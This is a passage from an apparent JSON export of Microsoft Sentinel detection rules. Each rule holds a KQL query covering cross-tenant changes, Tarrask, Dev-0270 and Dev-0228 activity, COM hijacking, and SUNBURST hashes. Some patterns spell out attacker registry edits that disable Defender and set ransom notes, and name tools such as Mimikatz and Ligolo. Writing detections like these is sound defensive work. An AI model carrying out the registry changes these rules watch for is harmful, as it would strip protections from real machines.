PremodifiedOutboundSettings = trim('\"',tostring(Property.oldValue)),\n               ModifiedOutboundSettings = trim(@'\"',tostring(Property.newValue))\n  )\n| where PremodifiedOutboundSettings != ModifiedOutboundSettings\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InitiatingAppName"},{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"templateVersion":"1.1.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","Discovery"],"techniques":["T1078","T1136","T1087"],"displayName":"Cross-tenant Access Settings Organization Outbound Collaboration Settings Changed","enabled":true,"description":"Organizations are added in the Cross-tenant Access Settings to control communication inbound or outbound for users and applications. This detection notifies when Organization Outbound Collaboration Settings are changed for \"Users & Groups\" and for \"Applications\".","alertRuleTemplateName":"229f71ba-d83b-42a5-b83b-11a641049ed1","lastModifiedUtc":"2024-07-18T20:11:56.2090996Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ace22128-528d-4aae-b9f0-34c346f347ff","name":"ace22128-528d-4aae-b9f0-34c346f347ff","etag":"\"1b009ddd-0000-2700-0000-66d8a7f90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let short_uaLength = 5;\nlet long_uaLength = 1000;\nlet c_threshold = 100;\nW3CIISLog\n// Exclude local IPs as these create noise\n| where cIP !startswith \"192.168.\" and cIP != \"::1\"\n| where isnotempty(csUserAgent) and csUserAgent !in~ (\"-\", \"MSRPC\") and (string_size(csUserAgent) <= short_uaLength or string_size(csUserAgent) >= long_uaLength)\n| extend csUserAgent_size = string_size(csUserAgent)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ConnectionCount = count() by Computer, sSiteName, sPort, csUserAgent, csUserAgent_size, csUserName , csMethod, csUriStem, sIP, cIP, scStatus, scSubStatus, scWin32Status\n| where ConnectionCount < c_threshold\n| extend timestamp = StartTimeUtc, AccountCustomEntity = csUserName, HostCustomEntity = Computer, IPCustomEntity = cIP","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1190"],"displayName":"Anomalous User Agent connection attempt","enabled":true,"description":"Identifies connection attempts (success or fail) from clients with very short or very long User Agent strings and with less than 100 connection attempts.\n\nPLATFORM:IaaS,Windows;MITRE:TA0001;T1190","alertRuleTemplateName":"f845881e-2500-44dc-8ed7-b372af3e1e25","lastModifiedUtc":"2024-09-04T18:33:29.0929592Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/33b069c8-9ad3-4b39-bb96-cca33791b954","name":"33b069c8-9ad3-4b39-bb96-cca33791b954","etag":"\"87009165-0000-2700-0000-66fdc2720000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"DeviceProcessEvents \n| where (InitiatingProcessCommandLine has_all(@'\"reg\"', 'add', @'\"HKLM\\SOFTWARE\\Policies\\', '/v','/t', 'REG_DWORD', '/d', '/f') \n   and InitiatingProcessCommandLine has_any('DisableRealtimeMonitoring', 'UseTPMKey', 'UseTPMKeyPIN', 'UseAdvancedStartup', 'EnableBDEWithNoTPM', 'RecoveryKeyMessageSource') ) \n   or InitiatingProcessCommandLine has_all('\"reg\"', 'add', @'\"HKLM\\SOFTWARE\\Policies\\', '/v','/t', 'REG_DWORD', '/d', '/f', 'RecoveryKeyMessage', 'Your drives are Encrypted!', '@')\n| extend timestamp = TimeGenerated, AccountCustomEntity =  InitiatingProcessAccountName, HostCustomEntity = DeviceName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion","Impact"],"techniques":["T1562","T1486"],"displayName":"Dev-0270 Registry IOC - September 2022","enabled":true,"description":"The query below identifies modification of registry by Dev-0270 actor to disable security feature as well as to add ransom notes\nPLATFORM:Microsoft 365,IaaS,Windows\nMITRE:TA0005;T1562","alertRuleTemplateName":"2566e99f-ad0f-472a-b9ac-d3899c9283e6","lastModifiedUtc":"2024-10-02T22:00:13.9673245Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fcb94f68-48db-41d9-b903-2221d425afe4","name":"fcb94f68-48db-41d9-b903-2221d425afe4","etag":"\"8800fd22-0000-2700-0000-66fdcf040000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let Tarrask_threats = dynamic([\"HackTool:Win64/Tarrask!MS\", \"HackTool:Win64/Ligolo!MSR\", \"Behavior:Win32/ScheduledTaskHide.A\", \"Tarrask\"]);\nDeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join kind=rightouter ( SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (Tarrask_threats) or ThreatFamilyName in~ (Tarrask_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.CompromisedEntity\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities\n| extend HostName = tostring(split(CompromisedEntity, \".\")[0]), DomainIndex = toint(indexof(CompromisedEntity, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(CompromisedEntity, DomainIndex + 1), CompromisedEntity)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"CompromisedEntity"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"PublicIP"}]}],"templateVersion":"1.0.4","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1053"],"displayName":"AV detections related to Tarrask malware","enabled":true,"description":"This query looks for Microsoft Defender AV detections related to Tarrask malware. In Microsoft Sentinel, the SecurityAlerts table includes only the Device Name of the affected device, this query joins the DeviceInfo table to clearly connect other information such as Device group, ip, logged-on users etc. \n This would allow the Microsoft Sentinel analyst to have more context related to the alert, if available.\n Reference: https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/\nPLATFORM:Microsoft 365,Windows\nMITRE:TA0005;T1564","alertRuleTemplateName":"1785d372-b9fe-4283-96a6-3a1d83cabfd1","lastModifiedUtc":"2024-10-02T22:53:55.2714054Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6d601559-f1cd-4154-b5e0-eb4e092226e1","name":"6d601559-f1cd-4154-b5e0-eb4e092226e1","etag":"\"8500a0ee-0000-2700-0000-66fdacf50000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"BehaviorAnalytics\n// User modification is expected from this account so focus on logons\n| where ActivityType =~ \"LogOn\"\n| where UserName startswith \"Sync_\" and UsersInsights.AccountDisplayName =~ \"On-Premises Directory Synchronization Service Account\"\n// Filter out this expected activity\n| where ActivityInsights.App !~ \"Microsoft Azure Active Directory Connect\"\n| where InvestigationPriority > 0\n| extend Name = split(UserPrincipalName, \"@\")[0], UPNSuffix = split(UserPrincipalName, \"@\")[1]","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"SourceIPAddress"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DestinationDevice"}]}],"alertDetailsOverride":{"alertDisplayNameFormat":"Suspicious Sign In by AAD Connect Sync Account {{UserPrincipalName}} from {{SourceIPAddress}}","alertDescriptionFormat":"This query looks for sign ins by the Azure AD Connect Sync account to Azure where properties about the logon are anomalous.\nThis query uses Microsoft Sentinel's UEBA features to detect these suspicious properties.\nA threat actor may attempt to steal the Sync account credentials and use them to access Azure resources. This alert should be \nreviewed to ensure that the log in came was from a legitimate source.\nIn this case {{UserPrincipalName}} logged in from {{SourceIPAddress}}.\n","alertDynamicProperties":[]},"templateVersion":"1.0.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Suspicious Sign In by AAD Connect Sync Account","enabled":true,"description":"This query looks for sign ins by the Azure AD Connect Sync account to Azure where properties about the logon are anomalous.\nThis query uses Microsoft Sentinel's UEBA features to detect these suspicious properties.\nA threat actor may attempt to steal the Sync account credentials and use them to access Azure resources. This alert should be \nreviewed to ensure that the log in came was from a legitimate source.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1078;T1078.004,TA0004;T1098;T1098.005","alertRuleTemplateName":"2cd8b3d5-c9e0-4be3-80f7-0469d511c3f6","lastModifiedUtc":"2024-10-02T20:28:35.2130442Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ad471ca0-fc9b-42fc-8188-9957b420d5ed","name":"ad471ca0-fc9b-42fc-8188-9957b420d5ed","etag":"\"52019edc-0000-2700-0000-65aacac70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let files1 = dynamic([\"C:\\\\Windows\\\\TAPI\\\\lsa.exe\", \"C:\\\\Windows\\\\TAPI\\\\pa.exe\", \"C:\\\\Windows\\\\TAPI\\\\pc.exe\", \"C:\\\\Windows\\\\TAPI\\\\Rar.exe\"]);\nlet files2 = dynamic([\"svchost.exe\",\"wdmsvc.exe\"]);\nlet FileHash1 = dynamic([\"43109fbe8b752f7a9076eaafa417d9ae5c6e827cd5374b866672263fdebd5ec3\", \"ab50d8d707b97712178a92bbac74ccc2a5699eb41c17aa77f713ff3e568dcedb\", \"010e32be0f86545e116a8bc3381a8428933eb8789f32c261c81fd5e7857d4a77\",         \"56cd102b9fc7f3523dad01d632525ff673259dbc9a091be0feff333c931574f7\"]);\nlet FileHash2 = dynamic([\"2a1044e9e6e87a032f80c6d9ea6ae61bbbb053c0a21b186ecb3b812b49eb03b7\", \"9ab7e99ed84f94a7b6409b87e56dc6e1143b05034a5e4455e8c555dbbcd0d2dd\", \"18a072ccfab239e140d8f682e2874e8ff19d94311fc8bb9564043d3e0deda54b\"]);\nDeviceProcessEvents\n| where ( FolderPath has_any (files1) and SHA256 has_any (FileHash1)) or (FolderPath has_any (files2) and SHA256 has_any (FileHash2))\n| extend DvcId = DeviceId\n| join kind=leftouter (SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| mv-expand todynamic(Entities)\n| extend DvcId = tostring(parse_json(Entities).MdatpDeviceId)\n| where isnotempty(DvcId)\n// Higher risk score are for Defender alerts related to threat actor\n| extend AlertRiskScore = iif(ThreatName has_any (\"Backdoor:MSIL/ShellClient.A\", \"Backdoor:MSIL/ShellClient.A!dll\", \"Trojan:MSIL/Mimikatz.BA!MTB\"), 1.0, 0.5)\n| project DvcId, AlertRiskScore) on DvcId\n| extend AlertRiskScore = iif(isempty(AlertRiskScore), 0.0, AlertRiskScore)\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName, AccountCustomEntity = AccountName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"AccountCustomEntity"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","PrivilegeEscalation"],"techniques":["T1569","T1068"],"displayName":"Dev-0228 File Path Hashes November 2021","enabled":true,"description":"This hunting query looks for file paths/hashes related to observed activity by Dev-0228. The actor is known to use custom version of popular tool like PsExec, Procdump etc. to carry its activity.\n The risk score associated with each result is based on a number of factors, hosts with higher risk events should be investigated first.","alertRuleTemplateName":"3b443f22-9be9-4c35-ac70-a94757748439","lastModifiedUtc":"2024-01-19T19:17:26.7303157Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/97619f3a-f88b-41d9-aaa3-ba27183d19d3","name":"97619f3a-f88b-41d9-aaa3-ba27183d19d3","etag":"\"5300d413-0000-2700-0000-64a2cfb50000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let guids = dynamic([\"{ddc05a5a-351a-4e06-8eaf-54ec1bc2dcea}\",\"{1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}\",\"{4590f811-1d3a-11d0-891f-00aa004b2e24}\", \"{4de225bf-cf59-4cfc-85f7-68b90f185355}\", \"{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}\"]);\n  DeviceRegistryEvents\n  | where ActionType =~ \"RegistryValueSet\"\n  | where RegistryKey contains \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\CLSID\"\n  | where RegistryKey has_any (guids)\n  | where RegistryValueData has \"System32\\\\spool\\\\drivers\\\\color\"\n ","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"RegistryKey","fieldMappings":[{"identifier":"Key","columnName":"RegistryKey"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"InitiatingProcessFileName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingProcessAccountName"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1574"],"displayName":"COM Registry Key Modified to Point to File in Color Profile Folder","enabled":true,"description":"This query looks for changes to COM registry keys to point to files in C:\\Windows\\System32\\spool\\drivers\\color\\.\n  This can be used to enable COM hijacking for persistence.\n  Ref: https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/","alertRuleTemplateName":"ed8c9153-6f7a-4602-97b4-48c336b299e1","lastModifiedUtc":"2023-07-03T13:40:03.9571844Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0c403604-49d7-41ef-84d5-7c1d2f8a9a9b","name":"0c403604-49d7-41ef-84d5-7c1d2f8a9a9b","etag":"\"8500d4a3-0000-2700-0000-66fda9770000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\n  | where OperationName =~ \"Update user\"\n  | where Result =~ \"success\"\n  | mv-expand TargetResources\n  | mv-expand TargetResources.modifiedProperties\n  | where TargetResources_modifiedProperties.displayName =~ \"TargetId.UserType\"\n  | extend UpdatingServicePrincipal = tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalId)\n  | extend UpdatingUserPrincipal = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend UpdatingUser = iif(isnotempty(UpdatingServicePrincipal), UpdatingServicePrincipal, UpdatingUserPrincipal)\n  | extend UpdatedUserPrincipalName = tostring(TargetResources.userPrincipalName)\n  | project-reorder TimeGenerated, UpdatedUserPrincipalName, UpdatingUser\n  | where parse_json(tostring(TargetResources_modifiedProperties.newValue)) =~ \"\\\"Member\\\"\" and parse_json(tostring(TargetResources_modifiedProperties.oldValue)) =~ \"\\\"Guest\\\"\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UpdatingUser"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UpdatedUserPrincipalName"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1098"],"displayName":"User State changed from Guest to Member","enabled":true,"description":"Detects when a guest account in a tenant is converted to a member of the tenant.\n  Monitoring guest accounts and the access they are provided is important to detect potential account abuse.\n  Accounts converted to members should be investigated to ensure the activity was legitimate.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins\nPLATFORM:Azure AD,Microsoft 365,IaaS;MITRE:TA0003;T1078;T1078.004,TA0004;T1078;T1078.004","alertRuleTemplateName":"a09a0b8e-30fe-4ebf-94a0-cffe50f579cd","lastModifiedUtc":"2024-10-02T20:13:42.0691835Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/117bff81-01d6-4fac-88d1-7d4db984574f","name":"117bff81-01d6-4fac-88d1-7d4db984574f","etag":"\"860060cb-0000-2700-0000-66fdb8730000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let starttime = 14d;\nlet timeframe = 1d;\nlet scorethreshold = 3;\nlet baselinethreshold = 5;\nlet aadFunc = (tableName:string){\n    IdentityInfo\n    | where TimeGenerated > ago(starttime)\n    | summarize arg_max(TimeGenerated, *) by AccountUPN\n    | mv-expand AssignedRoles\n    | where AssignedRoles contains 'Admin' or GroupMembership has \"Admin\"\n    | summarize Roles = make_list(AssignedRoles) by AccountUPN = tolower(AccountUPN)\n    | join kind=inner (\n        table(tableName)\n        | where TimeGenerated between (startofday(ago(starttime))..startofday(now()))\n        | where ResultType != 0\n        | where ResultType != 70044\n        | extend UserPrincipalName = tolower(UserPrincipalName)\n    ) on $left.AccountUPN == $right.UserPrincipalName\n    | extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, Roles = tostring(Roles)\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nlet allSignins = union isfuzzy=true aadSignin, aadNonInt;\nlet TimeSeriesAlerts = \n    allSignins\n    | make-series HourlyCount=count() on TimeGenerated from startofday(ago(starttime)) to startofday(now()) step 1h by UserPrincipalName, Roles\n    | extend (anomalies, score, baseline) = series_decompose_anomalies(HourlyCount, scorethreshold, -1, 'linefit')\n    | mv-expand HourlyCount to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long)\n    // Filtering low count events per baselinethreshold\n    | where anomalies > 0 and baseline > baselinethreshold\n    | extend AnomalyHour = TimeGenerated\n    | project UserPrincipalName, Roles, AnomalyHour, TimeGenerated, HourlyCount, baseline, anomalies, score;\n// Filter the alerts for specified timeframe\nTimeSeriesAlerts\n| where TimeGenerated > startofday(ago(timeframe))\n| join kind=inner ( \n    allSignins\n    | where TimeGenerated > startofday(ago(timeframe))\n    // create a new column and round to hour\n    | extend DateHour = bin(TimeGenerated, 1h)\n    | summarize PartialFailedSignins = count(), LatestAnomalyTime = arg_max(TimeGenerated, *) by bin(TimeGenerated, 1h), OperationName, Category, ResultType, ResultDescription, UserPrincipalName, Roles, UserDisplayName, AppDisplayName, ClientAppUsed, IPAddress, ResourceDisplayName\n) on UserPrincipalName, $left.AnomalyHour == $right.DateHour\n| project LatestAnomalyTime, OperationName, Category, UserPrincipalName, Roles = todynamic(Roles), UserDisplayName, ResultType, ResultDescription, AppDisplayName, ClientAppUsed, UserAgent, IPAddress, Location, AuthenticationRequirement, ConditionalAccessStatus, ResourceDisplayName, PartialFailedSignins, TotalFailedSignins = HourlyCount, baseline, anomalies, score\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"templateVersion":"1.1.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Privileged Accounts - Sign in Failure Spikes","enabled":true,"description":"Identifies spike in failed sign-ins from Privileged accounts. Privileged accounts list can be based on IdentityInfo UEBA table.\nSpike is determined based on Time series anomaly which will look at historical baseline values.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0003;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0004;T1078;T1078.004,TA0005;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0006;T1110;T1110.001","alertRuleTemplateName":"34c5aff9-a8c2-4601-9654-c7e46342d03b","lastModifiedUtc":"2024-10-02T21:17:30.2836127Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2820313f-0cb5-41d6-a1a5-7cb35554136a","name":"2820313f-0cb5-41d6-a1a5-7cb35554136a","etag":"\"8600326f-0000-2700-0000-66fdb36e0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let SunburstMD5=dynamic([\"b91ce2fa41029f6955bff20079468448\",\"02af7cec58b9a5da1c542b5a32151ba1\",\"2c4a910a1299cdae2a4e55988a2f102e\",\"846e27a652a5e1bfbd0ddd38a16dc865\",\"4f2eb62fa529c0283b28d05ddd311fae\"]);\nlet SupernovaMD5=\"56ceb6d0011d87b6e4d7023d7ef85676\";\nDeviceFileEvents\n| where MD5 in(SunburstMD5) or MD5 in(SupernovaMD5)\n| extend HashAlgorithm = \"MD5\"\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingProcessAccountUpn"},{"identifier":"Name","columnName":"InitiatingProcessAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingProcessAccountDomain"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"HashAlgorithm"},{"identifier":"Value","columnName":"MD5"}]}],"templateVersion":"1.0.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","Persistence","InitialAccess"],"techniques":["T1195","T1059","T1546"],"displayName":"SUNBURST and SUPERNOVA backdoor hashes","enabled":true,"description":"Identifies SolarWinds SUNBURST and SUPERNOVA backdoor file hash IOCs in DeviceFileEvents\nReferences:\n- https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n- https://gist.github.com/olafhartong/71ffdd4cab4b6acd5cbcd1a0691ff82f\nPLATFORM:Azure AD,Microsoft 